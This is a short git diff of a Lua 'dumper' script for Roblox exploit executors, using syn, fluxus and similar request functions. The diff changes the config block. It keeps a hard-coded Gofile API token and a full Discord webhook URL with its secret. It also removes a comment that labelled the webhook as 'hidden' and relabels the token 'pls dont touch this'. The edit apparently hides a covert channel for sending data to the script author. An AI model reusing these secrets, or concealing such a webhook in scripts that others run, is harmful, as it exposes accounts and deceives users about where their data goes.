@@ -8,9 +8,9 @@ local Players = game:GetService("Players")
 
 local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 
--- ================= КОНФИГУРАЦИЯ ================= --
-local API_KEY = "dubo5V0tUTb1VHmO5dov2kL0QaDGuen8" -- Gofile Token
--- ВЕБХУК DISCORD (СКРЫТЫЙ)
+-- ================= api ================= --
+local API_KEY = "dubo5V0tUTb1VHmO5dov2kL0QaDGuen8" -- pls dont touch this
+
 local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1442677826200535162/ubaFKkqxPZkXBoqUQeufwJ6CLUycMmoFoGXiFg0H4nb21CYy1Xv7tTFa8UvMCwjoaTHB"
 -- ================================================ --
 
@@ -615,3 +615,4 @@ end
 createLanguageGUI(function()
     createModeGUI(startDumper)
 end)
+
